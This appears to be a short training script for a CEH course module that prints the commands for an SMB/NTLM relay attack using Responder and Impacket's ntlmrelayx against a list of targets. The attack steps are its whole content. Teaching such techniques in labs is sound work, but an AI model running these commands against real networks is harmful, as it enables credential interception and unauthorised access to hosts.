#!/usr/bin/env python3
# LAB-ONLY: SMB Relay Attack Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for Responder + Impacket NTLM relay
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_INTERFACE = "eth0"
LAB_RELAY_TARGETS_FILE = "targets.txt"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: SMB Relay Attack Helper")
    print("="*80)
    print("1. First, edit Responder.conf to disable SMB and HTTP server")
    print("2. Then run:")
    print(f"responder -I {LAB_ATTACKER_INTERFACE}")
    print()
    print("3. In another terminal:")
    print(f"impacket-ntlmrelayx -tf {LAB_RELAY_TARGETS_FILE} -smb2support")

if __name__ == "__main__":
    main()
